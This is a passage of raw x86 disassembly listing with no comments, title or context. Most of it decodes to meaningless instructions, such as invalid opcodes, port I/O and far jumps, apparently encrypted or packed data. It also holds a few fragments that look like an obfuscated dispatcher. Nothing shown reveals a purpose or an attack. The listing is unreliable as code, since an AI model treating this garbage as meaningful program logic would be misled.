  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	jmp    esp
  40b509:	mov    al,0xb3
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b546
  40b514:	imul   esp,DWORD PTR [edx+0x59a4714e],0x6d681b1f
  40b51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b51f:	cmp    al,BYTE PTR [esi]
  40b521:	mov    ebp,ss
  40b523:	(bad)  
  40b524:	test   eax,0x4cb4b7ce
  40b529:	jo     0x40b505
  40b52b:	mov    bh,0xdb
  40b52d:	push   ebx
  40b52e:	aas    
  40b52f:	scas   eax,DWORD PTR es:[edi]
  40b530:	xchg   DWORD PTR [ecx+0x78],edi
  40b533:	ins    BYTE PTR es:[edi],dx
  40b534:	adc    ebx,esp
  40b536:	rcl    cl,cl
  40b538:	and    bl,BYTE PTR [ebx+0x4e]
  40b53b:	int    0x6a
  40b53d:	mov    dh,0x92
  40b53f:	je     0x40b597
  40b541:	mov    ch,0xf7
  40b543:	sbb    DWORD PTR [ecx-0x7ce840c8],esi
  40b549:	fs fwait
  40b54b:	cmp    eax,0x6f8a0aeb
  40b550:	mov    BYTE PTR [ebp-0x2f],dh
  40b553:	mov    bl,0x4e
  40b555:	mov    al,0xb4
  40b557:	es pop ecx
  40b559:	cmp    esi,DWORD PTR [edx]
  40b55b:	out    dx,eax
  40b55c:	cmp    eax,0xec979513
  40b561:	or     BYTE PTR [edi-0x7d],dh
  40b564:	data16 jnp 0x40b558
  40b567:	icebp  
  40b568:	aad    0x5d
  40b56a:	ror    DWORD PTR [ebp-0xc90c943],cl
  40b570:	imul   esi,DWORD PTR [esi-0x73],0xd
  40b574:	and    edx,eax
  40b576:	mov    edx,0xdd599c1
  40b57b:	mov    cl,0xe4
  40b57d:	in     eax,0x9a
  40b57f:	ss push 0x7a3d0fc3
  40b585:	sbb    esi,DWORD PTR [edi+ebp*1-0x39]
  40b589:	mov    bl,0x43
  40b58b:	mov    ah,0xe5
  40b58d:	pop    ebx
  40b58e:	inc    edx
  40b58f:	mov    eax,ds:0xe5a243e3
  40b594:	mov    ebx,0x239de522
  40b599:	jmp    0xdf49:0xaaa6ad86
  40b5a0:	outs   dx,BYTE PTR ds:[esi]
  40b5a1:	ds jp  0x40b580
  40b5a4:	(bad)  
  40b5a5:	lods   eax,DWORD PTR ds:[esi]
  40b5a6:	test   eax,0x218b0c66
  40b5ab:	jmp    0x19f7:0x80bb47c7
  40b5b2:	in     eax,dx
  40b5b3:	out    dx,al
  40b5b4:	add    edi,ecx
  40b5b6:	adc    dh,BYTE PTR [ecx+0x3d]
  40b5b9:	sbb    BYTE PTR [ecx],bl
  40b5bb:	cmp    BYTE PTR ds:0x1e49770,0x86
  40b5c2:	fs std 
  40b5c4:	mov    esp,0xb429009
  40b5c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ca:	jg     0x40b5d9
  40b5cc:	aaa    
  40b5cd:	push   ss
  40b5ce:	mov    edx,0xd8ba2555
  40b5d3:	(bad)  
  40b5d5:	pop    ebp
  40b5d6:	ret    0x476e
  40b5d9:	and    dl,al
  40b5db:	push   esi
  40b5dc:	mov    bh,0xff
  40b5de:	mov    DWORD PTR [esi],ecx
  40b5e0:	mov    ds:0x83f1b24d,eax
  40b5e5:	clc    
  40b5e6:	jo     0x40b613
  40b5e8:	mov    edi,0xfe40cab
  40b5ed:	dec    edi
  40b5ee:	mov    dl,0x56
  40b5f0:	fiadd  WORD PTR [ebx+0x26]
  40b5f3:	inc    edi
  40b5f4:	popa   
  40b5f5:	loopne 0x40b601
  40b5f7:	xchg   ecx,eax
  40b5f8:	int    0x92
  40b5fa:	inc    ebx
  40b5fb:	cmc    
  40b5fc:	pop    esi
  40b5fd:	clc    
  40b5fe:	xor    ecx,DWORD PTR [edx-0x67]
  40b601:	mov    dh,0x62
  40b603:	enter  0x801d,0x54
  40b607:	mov    ds:0xec66ca74,eax
  40b60c:	mov    ds:0x124f4761,eax
  40b611:	ret    0x712d
  40b614:	cli    
  40b615:	cmp    esp,edi
  40b617:	in     al,dx
  40b618:	mov    edx,0xf923df8
  40b61d:	inc    esi
  40b61e:	xchg   edx,eax
  40b61f:	mov    bl,0xed
  40b621:	ds pusha 
  40b623:	fsubr  DWORD PTR [ebp-0xecac234]
  40b629:	xor    dh,BYTE PTR [edx]
  40b62b:	sub    DWORD PTR [ebp-0x1a399e5c],0xbbd9598c
  40b635:	mov    bh,0x18
  40b637:	mul    esi
  40b639:	add    al,ah
  40b63b:	mov    gs,WORD PTR [esi+0x15]
  40b63e:	call   FWORD PTR [edx]
  40b640:	test   esi,edx
  40b642:	cmc    
  40b643:	dec    ebx
  40b644:	inc    esi
  40b645:	ds and al,0x50
  40b648:	pop    ebx
  40b649:	mov    ebx,0xe088eb04
  40b64e:	mov    bh,0xa5
  40b650:	hlt    
  40b651:	fisubr DWORD PTR [edi+0x17bbc38b]
  40b657:	pusha  
  40b658:	std    
  40b659:	jge    0x40b62e
  40b65b:	dec    ecx
  40b65c:	cmp    ebp,DWORD PTR [ebp-0x2a]
  40b65f:	cmc    
  40b660:	mov    al,0x77
  40b662:	aas    
  40b663:	xor    ah,BYTE PTR [edx+edx*4-0x48]
  40b667:	xchg   DWORD PTR ds:0x9ececf53,edx
  40b66d:	jle    0x40b655
  40b66f:	cs stos DWORD PTR es:[edi],eax
  40b671:	dec    esi
  40b672:	mov    ebp,0x9aa89625
  40b677:	int    0x77
  40b679:	or     ecx,DWORD PTR [esi+0x47cae2ed]
  40b67f:	aam    0x9d
  40b681:	cmp    BYTE PTR [edx-0x1a],dh
  40b684:	or     al,0x3e
  40b686:	mov    DWORD PTR [ecx],esp
  40b688:	dec    esp
  40b689:	xchg   edx,eax
  40b68a:	and    eax,ecx
  40b68c:	push   0x25a7d775
  40b691:	push   esp
  40b692:	fisttp DWORD PTR [edi+0x7d]
  40b695:	mov    edx,0xf769f2f
  40b69a:	or     dh,al
  40b69c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b69d:	sub    al,0x5
  40b69f:	xchg   esp,eax
  40b6a0:	mov    ds:0x54f4a91c,al
  40b6a5:	push   0xa160ad93
  40b6aa:	jmp    0xf77cba84
  40b6af:	daa    
  40b6b0:	call   FWORD PTR [eax]
  40b6b2:	scas   al,BYTE PTR es:[edi]
  40b6b3:	pop    esi
  40b6b4:	dec    eax
  40b6b5:	shl    edi,cl
  40b6b7:	xor    ah,BYTE PTR [ebx+0x5a]
  40b6ba:	mov    dl,0x8c
  40b6bc:	or     ah,dl
  40b6be:	dec    esi
  40b6bf:	ds pop esp
  40b6c1:	and    eax,0xa9598127
  40b6c6:	sbb    ebp,edx
  40b6c8:	popa   
  40b6c9:	fs out 0x19,al
  40b6cc:	push   0xfffffff3
  40b6ce:	xor    eax,0x172a414
  40b6d3:	sbb    bh,BYTE PTR [edi+eiz*4+0x40]
  40b6d7:	daa    
  40b6d8:	cld    
  40b6d9:	test   al,0xe7
  40b6db:	jp     0x40b70a
  40b6dd:	enter  0x87ac,0xe6
  40b6e1:	adc    eax,0xd69aa48f
  40b6e6:	xor    al,0x6f
  40b6e8:	loopne 0x40b766
  40b6ea:	adc    BYTE PTR [ecx],ch
  40b6ec:	lea    ebp,[eax+ebx*4+0xe]
  40b6f0:	popa   
  40b6f1:	cs add ecx,esp
  40b6f4:	out    0x8a,al
  40b6f6:	push   0xd
  40b6f8:	aaa    
  40b6f9:	and    al,0x17
  40b6fb:	xchg   ebx,eax
  40b6fc:	jns    0x40b6f2
  40b6fe:	sbb    BYTE PTR [edx],bl
  40b700:	popw   es
  40b702:	push   es
  40b703:	loope  0x40b6ed
  40b705:	aad    0xc8
  40b707:	data16 jecxz 0x40b746
  40b70a:	add    dl,BYTE PTR [edx-0xc]
  40b70d:	ds loop 0x40b772
  40b710:	mov    edi,0x5761d44
  40b715:	mov    bl,0xfc
  40b717:	mov    cl,0x9
  40b719:	push   esi
  40b71a:	mov    ah,BYTE PTR [ebx-0x526e4009]
  40b720:	jb     0x40b70e
  40b722:	jnp    0x40b754
  40b724:	pop    es
  40b725:	pushf  
  40b726:	jae    0x40b71b
  40b728:	sub    edi,DWORD PTR [esp+ebp*2-0x5ddda677]
  40b72f:	xor    eax,0xbba22820
  40b734:	fwait
  40b735:	mov    eax,DWORD PTR [edx+0x7beb3a83]
  40b73b:	dec    esp
  40b73c:	dec    edi
  40b73d:	inc    ebx
  40b73e:	sub    DWORD PTR ds:[edx],eax
  40b741:	cmp    al,0xef
  40b743:	and    edx,DWORD PTR [ebx+0x18]
  40b746:	sar    ecx,0xb0
  40b749:	nop
  40b74a:	jb     0x40b7c3
  40b74c:	pop    esi
  40b74d:	dec    edi
  40b74e:	jno    0x40b711
  40b750:	imul   esi,DWORD PTR gs:[edi-0xf],0x5c
  40b755:	mov    bl,0xb8
  40b757:	sar    BYTE PTR [ebx-0x2f8a01],0x75
  40b75e:	or     al,0xe8
  40b760:	scas   al,BYTE PTR es:[edi]
  40b761:	dec    edx
  40b762:	add    BYTE PTR [eax],al
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	push   eax
  40b78b:	push   esp
  40b78c:	je     0x40b7f2
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	xchg   edx,eax
  40b797:	pop    esp
  40b798:	pop    edi
  40b799:	and    ecx,0xffffffdf
  40b79c:	(bad)  
  40b79d:	call   0x1a63067
  40b7a2:	xchg   ecx,eax
  40b7a3:	cmp    al,0x34
  40b7a5:	lods   eax,DWORD PTR ds:[esi]
  40b7a6:	mov    eax,DWORD PTR [ebx-0x60f24945]
  40b7ac:	ja     0x40b7a4
  40b7ae:	adc    eax,0xe4ac94f7
  40b7b3:	pop    ss
  40b7b4:	mov    ebp,0xad3cf45b
  40b7b9:	int3   
  40b7ba:	push   0xffffff8a
  40b7bc:	bound  esi,QWORD PTR [ebp+0x2e]
  40b7bf:	and    bh,BYTE PTR [esi]
  40b7c1:	(bad)  
  40b7c2:	mov    ebx,0x56d076e4
  40b7c7:	clc    
  40b7c8:	adc    al,0x63
  40b7ca:	add    eax,0x2d2e31c3
  40b7cf:	inc    esi
  40b7d0:	xchg   BYTE PTR [edi+0x4f],cl
  40b7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7d5:	mov    eax,ds:0x8ca7a837
  40b7da:	and    BYTE PTR [edi+0x4e38701f],ch
  40b7e0:	push   0x247793df
  40b7e5:	fnstenv [edx]
  40b7e7:	push   0xffffffcf
  40b7e9:	sti    
  40b7ea:	jmp    0x40b814
  40b7ec:	icebp  
  40b7ed:	sbb    BYTE PTR [edi+ecx*8-0x318ba3ac],dl
  40b7f4:	scas   eax,DWORD PTR es:[edi]
  40b7f5:	jae    0x40b811
  40b7f7:	push   ebx
  40b7f8:	in     eax,dx
  40b7f9:	pop    edi
  40b7fa:	mov    cl,0x58
  40b7fc:	pop    eax
  40b7fd:	inc    esp
  40b7fe:	mov    BYTE PTR [esi+0x1fc7b487],cl
  40b804:	jo     0x40b84b
  40b806:	and    ah,bl
  40b808:	jmp    0x13f0:0xd26b2c3c
  40b80f:	mov    dh,0x8e
  40b811:	mov    edx,edi
  40b813:	(bad)  
  40b814:	mov    esp,0x923d27be
  40b819:	ret    0x6699
  40b81c:	je     0x40b7a0
  40b81e:	sbb    al,0xd3
  40b820:	bnd je 0x40b82a
  40b823:	xchg   ebx,eax
  40b824:	imul   ecx,edx,0xffffffd3
  40b827:	leave  
  40b828:	mov    esp,0x204c9c48
  40b82d:	(bad)  
  40b82e:	xor    al,0xb8
  40b830:	pop    edx
  40b831:	jb     0x40b8ab
  40b833:	cli    
  40b834:	(bad)  
  40b835:	les    ecx,FWORD PTR [esi]
  40b837:	push   esp
  40b838:	inc    esi
  40b839:	inc    edi
  40b83a:	or     dl,BYTE PTR [ecx]
  40b83c:	outs   dx,DWORD PTR ds:[esi]
  40b83d:	addr16 or eax,0x7128d798
  40b843:	fwait
  40b844:	daa    
  40b845:	push   es
  40b846:	retf   
  40b847:	pop    esp
  40b848:	mov    BYTE PTR [edx-0x72c1793b],0x96
  40b84f:	fisttp DWORD PTR [ebp+esi*1-0x6de1211c]
  40b856:	sub    eax,0xf7c78b23
  40b85b:	inc    esi
  40b85c:	(bad)  
  40b85d:	loopne 0x40b85f
  40b85f:	stc    
  40b860:	inc    eax
  40b861:	(bad)  
  40b862:	js     0x40b8c3
  40b864:	mov    esi,0x9a910c66
  40b869:	je     0x40b83b
  40b86b:	pusha  
  40b86c:	jae    0x40b7f5
  40b86e:	(bad)  
  40b86f:	in     eax,0x15
  40b871:	pusha  
  40b872:	loope  0x40b856
  40b874:	push   ds
  40b875:	cmp    eax,DWORD PTR [esi-0x20]
  40b878:	mov    dl,0x2d
  40b87a:	cmp    eax,0xb1fcbe3
  40b87f:	cs mov dl,0xc7
  40b882:	sub    BYTE PTR [ebp-0x72],0xd0
  40b886:	add    eax,0x68409e55
  40b88b:	ds pop edi
  40b88d:	adc    al,0xe2
  40b88f:	nop
  40b890:	dec    ebp
  40b891:	mov    edi,0xced0f180
  40b896:	je     0x40b8a2
  40b898:	mov    al,BYTE PTR [edi]
  40b89a:	or     DWORD PTR [edx+0x521c75d7],edx
  40b8a0:	dec    edx
  40b8a1:	loopne 0x40b8aa
  40b8a3:	mov    ds:0x69ce6907,al
  40b8a8:	jns    0x40b855
  40b8aa:	mov    bh,0xaa
  40b8ac:	out    0x6a,al
  40b8ae:	dec    esp
  40b8af:	bound  edi,QWORD PTR [ebp-0x21]
  40b8b2:	pop    ebp
  40b8b3:	inc    ecx
  40b8b4:	es stos BYTE PTR es:[edi],al
  40b8b6:	cmp    BYTE PTR [ebx],0xee
  40b8b9:	outs   dx,BYTE PTR ds:[esi]
  40b8ba:	jmp    0x372f80ea
  40b8bf:	test   eax,0x8a441959
  40b8c4:	stos   BYTE PTR es:[edi],al
  40b8c5:	add    DWORD PTR [eax+0x61],edx
  40b8c8:	push   0xffffffce
  40b8ca:	sub    BYTE PTR [eax+ebp*8+0x36],0x1d
  40b8cf:	ds sub eax,0xd86be43d
  40b8d5:	je     0x40b8ba
  40b8d7:	pop    DWORD PTR [ebp+0x6c]
  40b8da:	repz loope 0x40b88b
  40b8dd:	xor    DWORD PTR [edx+0x16ce4622],ebx
  40b8e3:	sub    BYTE PTR [ecx+ecx*8],0x46
  40b8e7:	nop
  40b8e8:	sbb    DWORD PTR [ebx-0x24],0xffffffb1
  40b8ec:	rol    BYTE PTR [esi-0x61f2f408],0x77
  40b8f3:	loop   0x40b95e
  40b8f5:	inc    edi
  40b8f6:	mov    ecx,0xc2c28d0f
  40b8fb:	sub    ch,0x53
  40b8fe:	(bad)  cs:[ebp+edx*1+0x58]
  40b903:	inc    esi
  40b904:	mov    ah,0x40
  40b906:	retf   
  40b907:	pop    ebp
  40b908:	fst    st(0)
  40b90a:	push   0xfffffff8
  40b90c:	in     al,0x70
  40b90e:	jg     0x40b915
  40b910:	sub    bh,bl
  40b912:	in     al,dx
  40b913:	aas    
  40b914:	add    dl,BYTE PTR [ecx]
  40b916:	sar    BYTE PTR [eax],1
  40b918:	xor    eax,0x32eb11f3
  40b91d:	(bad)  
  40b91e:	shl    BYTE PTR [edx],1
  40b920:	sbb    DWORD PTR [ebx+0x40],0xd3f87f82
  40b927:	cmc    
  40b928:	enter  0x316f,0x57
  40b92c:	jecxz  0x40b9ad
  40b92e:	ret    
  40b92f:	pop    edi
  40b930:	sub    ebp,DWORD PTR [esi]
  40b932:	in     al,dx
  40b933:	mov    dh,0x56
  40b935:	data16 rol BYTE PTR [eax],1
  40b938:	push   ebp
  40b939:	mov    ebx,DWORD PTR [edi+0x32]
  40b93c:	(bad)  
  40b93e:	fwait
  40b93f:	arpl   bx,ax
  40b941:	idiv   BYTE PTR ds:0x340a64ac
  40b947:	inc    esp
  40b948:	mov    ds:0xca5b626c,al
  40b94d:	lahf   
  40b94e:	jp     0x40b917
  40b950:	push   ds
  40b951:	pop    eax
  40b952:	call   0x5a63:0x35999270
  40b959:	int3   
  40b95a:	shr    al,1
  40b95c:	sub    eax,DWORD PTR [eax]
  40b95e:	lahf   
  40b95f:	jmp    0xffd626c2
  40b964:	dec    edx
  40b965:	push   ebx
  40b966:	add    DWORD PTR [edx+0x1d],edi
  40b969:	dec    esi
  40b96a:	sub    BYTE PTR ss:[ebp+0x49],bl
  40b96e:	jmp    FWORD PTR [edx-0x62]
  40b971:	xlat   BYTE PTR ds:[ebx]
  40b972:	gs jno 0x40b95f
  40b975:	cmp    BYTE PTR [ecx],bl
  40b977:	xor    eax,0x3563c7f1
  40b97c:	pushf  
  40b97d:	imul   esp,DWORD PTR [ebp+0x7b],0x26
  40b981:	popa   
  40b982:	jg     0x40b91f
  40b984:	les    ebx,FWORD PTR [ecx+0x4f]
  40b987:	jmp    0x40b95f
  40b989:	shr    BYTE PTR [edx],0x9a
  40b98c:	and    BYTE PTR [edi+0x629932e1],0x69
  40b993:	loope  0x40b9a9
  40b995:	inc    esp
  40b996:	jecxz  0x40b9ce
  40b998:	out    dx,eax
  40b999:	je     0x40b9a3
  40b99b:	popa   
  40b99c:	mov    bh,0xac
  40b99e:	pop    eax
  40b99f:	pop    edx
  40b9a0:	pushaw 
  40b9a2:	gs ja  0x40b9d9
  40b9a5:	push   ebx
  40b9a6:	pop    ds
  40b9a7:	jns    0x40b958
  40b9a9:	data16 add al,0xe4
  40b9ac:	ins    DWORD PTR es:[edi],dx
  40b9ad:	loope  0x40b943
  40b9af:	(bad)  
  40b9b0:	mov    eax,ds:0xddd4a078
  40b9b5:	sbb    bh,BYTE PTR gs:[edx]
  40b9b8:	sbb    al,BYTE PTR [edi+0x57]
  40b9bb:	xchg   esi,eax
  40b9bc:	mov    ebp,0xfa4642ff
  40b9c1:	scas   al,BYTE PTR es:[edi]
  40b9c2:	sti    
  40b9c3:	push   es
  40b9c4:	unpckhps xmm3,XMMWORD PTR [esi-0x3a]
  40b9c8:	(bad)  
  40b9c9:	cmp    al,0xc0
  40b9cb:	imul   eax,DWORD PTR [edx-0xad46e02],0xfa17c167
  40b9d5:	aam    0xfb
  40b9d7:	je     0x40ba12
  40b9d9:	scas   al,BYTE PTR es:[edi]
  40b9da:	jle    0x40b9ef
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x429a57f8],eax
  40ba0f:	jp     0x40b9dd
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	sti    
  40ba1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba1b:	sbb    DWORD PTR [esi-0x7ed59ede],ecx
  40ba21:	mov    ch,bh
  40ba23:	repnz imul DWORD PTR [ecx]
  40ba26:	test   al,0x15
  40ba28:	lock dec eax
  40ba2a:	cld    
  40ba2b:	pop    ecx
  40ba2c:	les    ecx,FWORD PTR [ebp+0x74d73b45]
  40ba32:	scas   eax,DWORD PTR es:[edi]
  40ba33:	aam    0x87
  40ba35:	out    dx,eax
  40ba36:	inc    edx
  40ba37:	mov    bh,0x21
  40ba39:	mov    BYTE PTR [eax-0xb],ch
  40ba3c:	outs   dx,BYTE PTR ds:[esi]
  40ba3d:	cmp    eax,0xfcea2743
  40ba42:	jns    0x40ba19
  40ba44:	xchg   edx,eax
  40ba45:	test   DWORD PTR [edi+0x347e1a71],ebx
  40ba4b:	jbe    0x40ba9b
  40ba4d:	push   eax
  40ba4e:	mov    ch,0x7f
  40ba50:	cmp    DWORD PTR [ebx+0x24],esp
  40ba53:	lahf   
  40ba54:	xor    bh,ch
  40ba56:	hlt    
  40ba57:	shl    DWORD PTR [esi-0x1bc4541a],0xc9
  40ba5e:	into   
  40ba5f:	push   esp
  40ba60:	jg     0x40bab1
  40ba62:	fstp   QWORD PTR [ecx-0x20c9cfcd]
  40ba68:	(bad)  
  40ba6a:	loopne 0x40bac8
  40ba6c:	and    BYTE PTR [eax-0x2ee8afc8],dl
  40ba72:	mov    edx,0xf0e5f242
  40ba77:	inc    ecx
  40ba78:	add    al,0xe3
  40ba7a:	add    al,0x76
  40ba7c:	mov    eax,ds:0xbafcf2db
  40ba81:	and    al,0xf7
  40ba83:	xchg   ebp,eax
  40ba84:	jno    0x40ba20
  40ba86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba87:	mov    al,0x3a
  40ba89:	jb     0x40baf6
  40ba8b:	push   cs
  40ba8c:	jmp    0x8e3:0xfdb1616f
  40ba93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba94:	sahf   
  40ba95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba96:	pushf  
  40ba97:	aaa    
  40ba98:	ss pop esi
  40ba9a:	mov    esp,edi
  40ba9c:	sub    edi,eax
  40ba9e:	and    DWORD PTR [eax+0x6eaa6fc3],ebx
  40baa4:	add    BYTE PTR [ebx+edi*8-0x25],ah
  40baa8:	pop    ecx
  40baa9:	shl    DWORD PTR gs:[ecx+0x505bc170],cl
  40bab0:	push   ecx
  40bab1:	push   0x4c
  40bab3:	aad    0xbb
  40bab5:	jmp    0x71a1:0xa21ebf92
  40babc:	push   ecx
  40babd:	mov    ch,BYTE PTR [ecx-0x30a1a5a8]
  40bac3:	adc    ebp,DWORD PTR [eax+0x35]
  40bac6:	cmp    DWORD PTR [ebx+0x4],esi
  40bac9:	xor    ecx,esp
  40bacb:	cmp    dl,0x7d
  40bace:	add    BYTE PTR [ecx-0x61],ah
  40bad1:	fldcw  WORD PTR [ebx]
  40bad3:	out    dx,al
  40bad4:	add    DWORD PTR [ebx-0x7d],ebp
  40bad7:	dec    ecx
  40bad8:	outs   dx,DWORD PTR ds:[esi]
  40bad9:	pop    esp
  40bada:	dec    ebx
  40badb:	xchg   ebp,eax
  40badc:	push   0x4654e05d
  40bae1:	lods   al,BYTE PTR ds:[esi]
  40bae2:	test   BYTE PTR [ebx-0x48b15b58],dl
  40bae8:	retf   
  40bae9:	cmp    DWORD PTR [ebp-0x41],ebx
  40baec:	sub    eax,0xaf7fa0cf
  40baf1:	xchg   DWORD PTR [edi-0x3baee24b],esi
  40baf7:	mov    cl,0x37
  40baf9:	or     edi,DWORD PTR [edx-0x7e]
  40bafc:	fistp  QWORD PTR [ebx+ebp*4+0x46]
  40bb00:	lds    ecx,FWORD PTR [edx]
  40bb02:	ss push ebp
  40bb04:	xchg   esp,eax
  40bb05:	cmp    BYTE PTR [esi+0x7b],dh
  40bb08:	and    eax,0xad1017b5
  40bb0d:	pop    ss
  40bb0e:	xchg   ebp,eax
  40bb0f:	mov    WORD PTR [eax+eax*4+0x45eccc29],ss
  40bb16:	mov    edx,0xa86082c5
  40bb1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb1c:	arpl   WORD PTR [esi-0x7ebabdc3],bp
  40bb22:	push   ds
  40bb23:	push   edx
  40bb24:	ja     0x40bb12
  40bb26:	dec    esp
  40bb27:	daa    
  40bb28:	cs jb  0x40bb8b
  40bb2b:	inc    ebp
  40bb2c:	jae    0x40baf5
  40bb2e:	ficomp WORD PTR [ecx+0x1adb97dd]
  40bb34:	imul   edi,DWORD PTR [edx],0xffffffb1
  40bb37:	bound  ecx,QWORD PTR [ebp+0x72b80318]
  40bb3d:	jl     0x40bb2a
  40bb3f:	(bad)  
  40bb41:	or     bl,0x4
  40bb44:	enter  0x58fe,0x15
  40bb48:	adc    al,0x0
  40bb4a:	jle    0x40bb16
  40bb4c:	fisub  WORD PTR [ebp-0x27]
  40bb4f:	push   ebx
  40bb50:	jo     0x40baf7
  40bb52:	cmp    DWORD PTR [ebx-0x5aa37fc4],edx
  40bb58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb59:	in     eax,0xef
  40bb5b:	jno    0x40bb23
  40bb5d:	sbb    BYTE PTR [eax+eiz*4-0x41],bh
  40bb61:	xchg   esi,eax
  40bb62:	or     al,0x43
  40bb64:	imul   esp,DWORD PTR [esi-0x6da62d66],0xffffff9f
  40bb6b:	sbb    bh,BYTE PTR [edx-0x67]
  40bb6e:	in     eax,dx
  40bb6f:	mov    ?,ebx
  40bb71:	outs   dx,BYTE PTR ds:[esi]
  40bb72:	(bad)  
  40bb73:	and    al,0xd9
  40bb75:	pusha  
  40bb76:	or     BYTE PTR [ebx-0x55cea62a],0xdc
  40bb7d:	test   eax,0xf9b38e38
  40bb82:	or     dl,dh
  40bb84:	bound  ebx,QWORD PTR [esi]
  40bb86:	sahf   
  40bb87:	jmp    0x563ad4c6
  40bb8c:	lea    esp,[ebx+eiz*2]
  40bb8f:	jp     0x40bb1c
  40bb91:	jo     0x40bb6b
  40bb93:	shl    bl,1
  40bb95:	dec    eax
  40bb96:	mov    BYTE PTR [ecx],dh
  40bb98:	ja     0x40bb8d
  40bb9a:	ret    0x977
  40bb9d:	mov    ds:0x6572ad7f,al
  40bba2:	jp     0x40bbba
  40bba4:	adc    eax,0x1f89b35d
  40bba9:	push   edi
  40bbaa:	das    
  40bbab:	mov    ebp,DWORD PTR [eax-0x776f4cd7]
  40bbb1:	sub    DWORD PTR [ebp+0x1f10152f],0x55
  40bbb8:	mov    edx,0xe7c28fed
  40bbbd:	out    0x49,al
  40bbbf:	inc    eax
  40bbc0:	and    ecx,edx
  40bbc2:	xchg   DWORD PTR [ebx],eax
  40bbc4:	fs xchg edx,eax
  40bbc6:	sub    al,0x9d
  40bbc8:	ret    
  40bbc9:	les    eax,FWORD PTR [ebp-0x61bb8408]
  40bbcf:	pop    ebx
  40bbd0:	nop
  40bbd1:	pop    esp
  40bbd2:	mov    ds:0xeef82913,eax
  40bbd7:	and    al,dh
  40bbd9:	test   DWORD PTR [edx+0x5893e5dd],esp
  40bbdf:	shl    bl,0x6e
  40bbe2:	inc    edi
  40bbe3:	mov    ah,0xa4
  40bbe5:	popa   
  40bbe6:	mov    es,WORD PTR [ebp+eiz*4-0x5]
  40bbea:	ins    BYTE PTR es:[edi],dx
  40bbeb:	mov    ds:0xde28670b,eax
  40bbf0:	outs   dx,BYTE PTR ds:[esi]
  40bbf1:	jb     0x40bba2
  40bbf3:	jo     0x40bc20
  40bbf5:	fcmovnbe st,st(4)
  40bbf7:	rol    BYTE PTR [edx],cl
  40bbf9:	fisttp WORD PTR [esi-0x72adb6cb]
  40bbff:	mov    ds:0xf14bb6bd,al
  40bc04:	popf   
  40bc05:	jae    0x40bc47
  40bc07:	cld    
  40bc08:	aaa    
  40bc09:	and    esi,esi
  40bc0b:	pop    ds
  40bc0c:	mov    ?,WORD PTR [edi]
  40bc0e:	retf   0xe7c7
  40bc11:	scas   al,BYTE PTR es:[edi]
  40bc12:	cmp    dl,dh
  40bc14:	adc    DWORD PTR [ebx],esi
  40bc16:	jnp    0x40bbd9
  40bc18:	out    dx,al
  40bc19:	ja     0x40bc67
  40bc1b:	fmul   st(6),st
  40bc1d:	sti    
  40bc1e:	adc    ecx,edx
  40bc20:	sub    BYTE PTR [ecx+0x727bd291],dl
  40bc26:	ret    0xeb9c
  40bc29:	xchg   esi,eax
  40bc2a:	div    BYTE PTR [edi+eax*4]
  40bc2d:	push   ss
  40bc2e:	mov    fs,WORD PTR [edx+0x4c90c1ef]
  40bc34:	or     BYTE PTR [eax+0x24],al
  40bc37:	sub    BYTE PTR [ecx-0x763cf121],bl
  40bc3d:	mov    ds:0x915c785e,eax
  40bc42:	xor    al,0x20
  40bc44:	retf   0xf35f
  40bc47:	mov    edx,0x75bf735f
  40bc4c:	ins    DWORD PTR es:[edi],dx
  40bc4d:	mov    cs,esi
  40bc4f:	inc    eax
  40bc50:	cmp    eax,0xf7de0156
  40bc55:	xchg   ebx,eax
  40bc56:	ficomp DWORD PTR [ebp-0x22]
  40bc59:	jo     0x40bc7c
  40bc5b:	shr    DWORD PTR [ebx-0x48f0568b],cl
  40bc61:	add    al,0x78
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
